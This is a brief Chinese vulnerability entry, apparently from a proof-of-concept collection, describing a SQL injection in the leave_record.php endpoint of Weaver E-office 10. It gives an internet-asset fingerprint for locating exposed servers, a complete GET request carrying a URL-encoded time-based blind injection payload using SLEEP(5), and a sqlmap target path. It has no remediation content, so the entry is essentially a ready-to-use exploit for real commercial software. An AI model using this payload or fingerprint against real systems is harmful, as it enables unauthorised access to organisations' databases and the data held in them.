# 泛微E-office10leave_record存在SQL注入漏洞

- **系统**：泛微OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`web.body="eoffice10"`
- **请求**：`GET /eoffice10/server/ext/system_support/leave_record.php?flow_id=1%27+AND+%28SELECT+4196+FROM+%28SELECT%28SLEEP%285%29%29%29LWzs%29+AND+%27zfNf%27%3D%27zfNf&run_id=1&table_field=1&table_field_name=user()&max_rows=10 HTTP/1.1`

**请求体 / payload**
```

sqlmap
/eoffice10/server/ext/system_support/leave_record.php?flow_id=1&run_id=1&table_field=1&table_field_name=user()&max_rows=10
```

**其他**
- 泛微E-office 10 leave\_record存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 泛微OA E-office V10